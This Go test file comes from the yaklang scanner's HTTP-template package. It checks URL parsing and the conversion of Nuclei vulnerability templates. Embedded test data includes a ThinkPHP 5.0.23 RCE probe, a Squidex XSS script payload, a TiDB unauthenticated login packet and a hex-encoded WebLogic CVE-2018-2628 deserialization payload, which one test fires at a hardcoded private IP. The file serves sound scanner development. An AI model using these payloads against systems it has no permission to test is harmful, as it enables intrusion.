package httptpl

import (
	"bytes"
	"fmt"
	"github.com/davecgh/go-spew/spew"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/filter"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/yak/yaklib/tools"
	"strings"
	"testing"
)

func TestStringToUrl(t *testing.T) {
	check := false
	for _, u := range utils.ParseStringToUrls("baidu.com") {
		if strings.Contains(u, "https://baidu.com") {
			check = true
		}
	}
	if !check {
		panic(1)
	}
	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("baidu.com") {
		if strings.Contains(u, "https://www.baidu.com") {
			check = true
		}
	}
	if !check {
		panic(1)
	}

	check = false
	for _, u := range utils.ParseStringToUrls("www.baidu.com/abc") {
		if strings.Contains(u, "https://www.baidu.com/abc") {
			check = true
		}
	}
	if !check {
		panic(2)
	}

	check = false
	for _, u := range utils.ParseStringToUrls("baidu.com/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://baidu.com/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}

	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("baidu.com/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://www.baidu.com/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}

	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("1.1.1.1:3321/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://1.1.1.1:3321/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}

	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("1.1.1.1/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://1.1.1.1/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}
}

func TestScan2(t *testing.T) {
	consts.GetGormProfileDatabase()
	consts.GetGormProjectDatabase()

	ScanPacket([]byte(`GET / HTTP/1.1
Host: 127.0.0.1:8004

abc`), lowhttp.WithHttps(false), WithMode("nuclei"),
		WithFuzzQueryTemplate("thinkphp"),
		// WithConcurrentTemplates(1), WithConcurrentInTemplates(1),
		WithEnableReverseConnectionFeature(false),
	)
}

func TestThinkphpPacket(t *testing.T) {
	tpl, err := CreateYakTemplateFromNucleiTemplateRaw(`id: thinkphp-5023-rce

info:
  name: ThinkPHP 5.0.23 - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
  tags: thinkphp,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?s=captcha"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# Enhanced by md on 2022/10/05`)
	if err != nil {
		panic(err)
	}

	checked := false
	for req := range tpl.generateRequests() {
		if bytes.Contains(req.Requests[0].Raw, []byte("\r\n\r\n_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1")) {
			spew.Dump(req.Requests[0].Raw)
			checked = true
		}
	}
	if !checked {
		panic(1)
	}
}

func TestThinkphpPacket_Vars(t *testing.T) {
	tpl, err := CreateYakTemplateFromNucleiTemplateRaw(`id: thinkphp-5023-rce

info:
  name: ThinkPHP 5.0.23 - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
  tags: thinkphp,rce

variables:
  a1: "{{rand_int(1000,9000)}}"
  a2: "{{rand_int(1000,9000)}}"
  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}" 

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?s=captcha--------a5{{a4}}"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1--------a5{{a4}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# Enhanced by md on 2022/10/05`)
	if err != nil {
		panic(err)
	}

	checked := false
	for req := range tpl.generateRequests() {
		var reqIns = req.Requests[0]
		println(string(reqIns.Raw))
		if bytes.Contains(req.Requests[0].Raw, []byte("\r\n\r\n_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1")) && bytes.Contains(reqIns.Raw, []byte("{{params(a4)")) {
			checked = true
		}
	}

	if tpl.Variables == nil {
		panic("empty variables")
	}
	spew.Dump(tpl.Variables.ToMap())
	if len(tpl.Variables.ToMap()) != 3 {
		panic(1)
	}

	if !checked {
		panic(1)
	}
}

func TestNewVars(t *testing.T) {
	vars := NewVars()
	vars.AutoSet("year", "{{rand_int(2000,2020)}}")
	vars.AutoSet("month", "0{{rand_int(1,7)}}")
	vars.AutoSet("day", "{{rand_int(1,28)}}")
	vars.AutoSet("expr", `{{year}}-{{month}}-{{day}}`)
	vars.AutoSet("result", `{{to_number(year)-to_number(month)-to_number(day)}}`)
	var a = vars.ToMap()

	actResult := utils.Atoi(fmt.Sprint(a["year"])) - utils.Atoi(fmt.Sprint(a["month"])) - utils.Atoi(fmt.Sprint(a["day"]))
	if actResult == 0 {
		panic("empty result vars")
	}

	if actResult != utils.Atoi(fmt.Sprint(a["result"])) {
		panic("result vars not equal")
	}
	spew.Dump(a)
}

func TestScanAuto(t *testing.T) {
	//consts.GetGormProjectDatabase()
	rawTemp := `
id: test
info:
  name: Squidex <7.4.0 - Cross-Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Squidex before 7.4.0 contains a cross-site scripting vulnerability via the squid.svg endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
  reference:
    - https://census-labs.com/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/
    - https://www.openwall.com/lists/oss-security/2023/03/16/1
    - https://nvd.nist.gov/vuln/detail/CVE-2023-24278
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-24278
    cwe-id: CWE-79
  metadata:
    shodan-query: http.favicon.hash:1099097618
    verified: "true"
  tags: cve,cve2023,xss,squidex,cms,unauth

variables:
  a1: "{{rand_int(1000,9000)}}"
  a2: "{{rand_int(1000,9000)}}"
  a3: "{{rand_int(1000,9000)}}{{a1}}"
  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{a4}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
    headers:
      Authorization: "{{a1+a3}} {{a2}} {{BaseURL}}"
      Test-Payload: "{{name}} {{a6}}"

    payloads:
      xadfasdfasf: C:\Users\go0p\Desktop\yak.txt
      name:
        - "admin123"
        - "aaa123"
      a6:
        - "321nimda"
        - 321aaa

    matchers-condition: and
    matchers:
      - type: dsl
        part: body
        dsl:
          - "true"


`
	_ = rawTemp
	tcpTemp := `id: tidb-unauth

info:
  name: TiDB - Unauthenticated Access
  author: lu4nx
  severity: high
  description: TiDB server was able to be accessed because no authentication was required.
  metadata:
    zoomeye-query: tidb +port:"4000"
  tags: network,tidb,unauth

network:
  - inputs:
      - read: 1024              # skip handshake packet
      - data: b200000185a6ff0900000001ff0000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640075045f70696406313337353030095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f757365720578787878780f5f636c69656e745f76657273696f6e06382e302e32360c70726f6772616d5f6e616d65056d7973716c  # authentication
        type: hex

    host:
      - "{{Hostname}}"
      - "{{Host}}:8085"

    read-size: 1024

    matchers:
      - type: binary
        binary:
          # resp format:
          # 07: length, 02: sequence number, 00: success
          - "0700000200000002000000"

    extractors:
      - type: regex
        regex:
          - 'Kernel Version \d\.\d\d\.\d\d\d'

      - type: regex
        regex:
          - 'Kernel 111Version \d\.\d\d\.\d\d\d'

# Enhanced by mp on 2022/07/20`
	_ = tcpTemp
	weblogicTemp := `
id: CVE-2018-2628

info:
  name: Oracle WebLogic Server Deserialization - Remote Code Execution
  author: milo2012
  severity: critical
  description: |
    The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services) versions 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3 contains an easily exploitable vulnerability that allows unauthenticated attackers with network access via T3 to compromise Oracle WebLogic Server.
  reference:
    - https://www.nc-lp.com/blog/weaponize-oracle-weblogic-server-poc-cve-2018-2628
    - https://nvd.nist.gov/vuln/detail/CVE-2018-2628
    - http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html
    - http://web.archive.org/web/20211207132829/https://securitytracker.com/id/1040696
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-2628
    cwe-id: CWE-502
  tags: cve,cve2018,oracle,weblogic,network,deserialization,kev
  metadata:
    max-request: 1

tcp:
  - inputs:
      - data: 74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a
        read: 1024
        type: hex
      - data: 000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd071a7727000d3234322e3231342e312e32353461863d1d0000000078
        read: 1024
        type: hex
      - data: 000003ad056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707729000a556e69636173745265660000000005a2000000005649e3fd00000000000000000000000000000078fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff
        read: 1024
        type: hex

    host:
      - "{{Hostname}}"

    read-size: 1024
    matchers:
      - type: regex
        regex:
          - "\\$Proxy[0-9]+"

# Enhanced by mp on 2022/04/14
`
	_ = weblogicTemp
	Scan := func(target any, opt ...interface{}) (chan *tools.PocVul, error) {
		var vCh = make(chan *tools.PocVul)
		//var targetVul *tools.PocVul
		filterVul := filter.NewFilter()
		i := processVulnerability(target, filterVul, vCh)
		c, _, _ := toConfig(opt...)
		tpl, err := CreateYakTemplateFromNucleiTemplateRaw(c.SingleTemplateRaw)
		if err != nil {
			log.Errorf("create yak template failed (raw): %s", err)
			close(vCh)
			return vCh, err
		}
		if len(tpl.HTTPRequestSequences) > 0 {
			opt = append(opt, _callback(i))
		}
		if len(tpl.TCPRequestSequences) > 0 {
			opt = append(opt, _tcpCallback(i))
		}

		go func() {
			defer close(vCh)
			ScanAuto(target, opt...)
		}()

		return vCh, nil
	}
	//flag, _ := codec.DecodeHex(`0700000200000002000000`)
	//server, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\n" +
	//	"Content-Length: 111\r\n" +
	//	"Server: nginx\r\n\r\n" +
	//	"" +
	//	"Kernel Version 1.11.111  " + string(flag)))
	server, port := "192.168.124.14", 7001
	fmt.Println(server, port)
	res, _ := Scan(
		utils.HostPort(server, port),
		//WithTemplateName("[CVE-2016-3081]: Apache S2-032 Struts - Remote Code Execution"),
		//WithTemplateRaw(rawTemp),
		//WithTemplateRaw(tcpTemp),
		WithTemplateRaw(weblogicTemp),
	)
	for r := range res {
		fmt.Println("xxx : ", r)
	}
}
